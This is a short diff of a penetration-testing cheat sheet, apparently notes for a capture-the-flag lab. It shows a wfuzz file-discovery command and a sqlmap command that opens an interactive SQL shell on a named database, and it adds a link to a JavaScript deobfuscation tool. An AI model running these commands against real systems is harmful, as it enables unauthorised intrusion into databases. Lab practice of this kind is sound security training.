@@ -8,7 +8,7 @@
 ### scan for files
     wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 -R2 http://138.68.182.108:32660/administrat/include/FUZZ.php
 
-## SQL Exploits 
+## SQL Exploits
 
 ### sqlmap
 
@@ -27,3 +27,8 @@
 #### interactive SQL shell
     # DB freelance
     sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 -D freelancer --sql-shell
+
+## Deobfuscation
+
+[ JStillery ]( https://en.kali.tools/?p=1354 )
+
